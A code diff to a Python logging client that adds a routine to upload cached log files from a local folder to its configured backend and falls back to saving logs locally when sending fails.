@@ -1,5 +1,6 @@
 import json
 import requests
+import os
 
 
 class Writer:
@@ -7,7 +8,23 @@ class Writer:
         self.backend_url = url
         self.file_name = None
 
-    def is_connected(self,mac="abc"):
+    def send_files(self):
+        for filename in os.listdir("logs"):
+            file_path = os.path.join("logs", filename)
+            if os.path.isfile(file_path):
+                with open(file_path, "r") as file:
+                    content = file.read()
+                    data = {"file_name": filename, "content": content}
+                    try:
+                        response = requests.post(f"{self.backend_url}/log", json=data, timeout=5)
+                        if response.status_code == 200:
+                            print(f"{filename} sent successfully")
+                            os.remove(file_path)
+                    except requests.RequestException as e:
+                        print(f"error: {filename}: {e}")
+
+
+    def is_connected(self,mac):
         response = requests.get(f"{self.backend_url}/connection/{mac}")
         return response.status_code == 200
 
@@ -22,22 +39,21 @@ class Writer:
             response = requests.post(f"{self.backend_url}/log", json=data, timeout=5)
             print("sending",response.status_code)
             if 200 < response.status_code < 300:
-                return True
+                print("Sent")
             else:
-                return False
+                print("did not send")
+                self.write_to_file(data)
         except requests.RequestException as e:
             print(f"sending error: {e}")
-            return False
+            self.write_to_file(data)
 
 
     def save_manager(self, data,file_name):
         self.file_name = f"logs/log_{file_name}.json"
-        if self.is_connected():
-            print("connected, sending to server")
-            self.send_to_server(data)
-        else:
-            print("unconnected, saving to file")
-            self.write_to_file(data)
+        print("sending to server")
+        self.send_to_server(data)
+        #print("unconnected, saving to file")
+        #self.write_to_file(data)
 
 
 
